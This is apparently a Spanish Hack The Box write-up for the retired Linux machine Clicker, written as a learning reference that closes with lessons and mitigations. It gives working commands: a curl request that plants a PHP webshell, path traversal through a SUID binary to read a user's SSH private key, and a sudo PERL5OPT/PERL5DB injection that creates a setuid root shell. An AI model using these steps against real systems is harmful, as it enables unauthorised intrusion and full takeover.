---
machine: Clicker
os: Linux
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [linux, web, nfs, mass-assignment, webshell, setuid, perl, privesc]
---

# Clicker — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

El share NFS `backups` expone el código fuente. Un mass assignment permite cambiar el rol a admin y una escritura de archivo da un webshell como `www-data`. El binario SUID `execute_query`, que corre como `jack`, permite leer su clave SSH mediante traversal; `jack` puede ejecutar `monitor.sh` como root con `SETENV`, y `PERL5OPT`/`PERL5DB` inyectan código en `xml_pp`.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,80,111,2049 <IP>
showmount -e clicker.htb
```

- `22` SSH, `80` Apache y NFS en `111`/`2049`.
- La web redirige a `clicker.htb` y tiene registro, login y un juego.
- `showmount` lista el share `backups`.

## Enumeración

Se monta el share y se descomprime el backup, que contiene el código PHP de la web.

```bash
mkdir /mnt/clicker && mount -t nfs clicker.htb:/mnt/backups /mnt/clicker
unzip /mnt/clicker/*.zip
```

El registro acepta un campo `role`. El filtro se puede saltar con un salto de línea o una SQLi, y el objeto se actualiza de forma masiva.

## Foothold

Con la cuenta convertida en admin se accede a `admin.php`. La aplicación escribe el nickname en un archivo dentro del webroot; se envía una webshell PHP y se ejecuta como `www-data`.

```bash
curl 'http://clicker.htb/admin.php' --data-urlencode 'nickname=<?php system($_GET["c"]); ?>'
```

## Movimiento lateral

`/opt/manage/execute_query` es SUID de `jack` y ejecuta `mysql` con un archivo SQL. El caso por defecto acepta una ruta y permite traversal; se lee la clave privada de `jack` y se entra por SSH.

```bash
./execute_query 223 ../../../home/jack/.ssh/id_rsa
ssh -i jack.key jack@clicker.htb
```

## Escalada de privilegios

`jack` puede ejecutar `/opt/monitor.sh` como root con `SETENV`. El script llama a `xml_pp`, un Perl, y permite conservar variables de entorno. `PERL5OPT=-d` activa el depurador y `PERL5DB` ejecuta código antes del programa.

```bash
sudo PERL5OPT=-d PERL5DB='system("cp /bin/bash /tmp/root; chmod 6777 /tmp/root")' /opt/monitor.sh
/tmp/root -p
```

También funcionan un proxy HTTP con XXE contra `diagnostic.php` y `LD_PRELOAD`.

## Evidencia

- NFS `backups` con el código.
- Mass assignment y webshell.
- `execute_query` SUID y clave de `jack`.
- `monitor.sh` con `SETENV`.
- `PERL5OPT`/`PERL5DB` y root.

## Lecciones aprendidas

- Un share NFS de backups puede filtrar toda la aplicación.
- Filtrar un campo no evita el mass assignment.
- Un binario SUID que ejecuta un cliente SQL puede leer archivos del usuario.
- `SETENV` en sudoers convierte variables de entorno en ejecución.

## Mitigación y detección

- Restringir NFS por host y no guardar código en backups.
- Usar listas blancas de campos y roles.
- Revisar binarios SUID y evitar `system()` con rutas controladas.
- No usar `SETENV`; limpiar `PERL5OPT`, `PERL5DB` y `LD_PRELOAD`.

## Referencias

- [0xdf — Clicker](https://0xdf.gitlab.io/2024/01/27/htb-clicker.html)
- [IppSec — Clicker](https://www.youtube.com/watch?v=8IkHQ84lmPI)
- [Hack The Box — Clicker](https://app.hackthebox.com/machines/clicker)
